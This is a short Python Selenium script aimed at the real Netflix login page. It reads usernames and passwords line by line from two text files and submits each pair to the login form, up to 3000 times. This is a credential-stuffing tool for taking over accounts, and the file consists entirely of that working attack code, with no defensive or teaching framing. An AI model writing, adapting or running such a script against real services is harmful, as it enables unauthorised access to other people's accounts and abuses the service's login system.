from selenium import webdriver
from selenium.webdriver.chrome.webdriver import WebDriver
from webdriver_manager.chrome import ChromeDriverManager


driver: WebDriver = webdriver.Chrome(ChromeDriverManager().install())
url = "https://www.netflix.com/tr-en/login"

us = open("username.txt", "r")
pw = open("password.txt", "r")

for i in range(3000):
    a = us.readline()

    b = pw.readline()

    driver.get(url)
    driver.find_element_by_id("id_userLoginId").send_keys(a)
    driver.find_element_by_id("id_password").send_keys(b)
    driver.find_element_by_xpath("/html/body/div[1]/div/div[3]/div/div/div[1]/form/button").click()
    driver.refresh()
us.close()
pw.close()
driver.close()
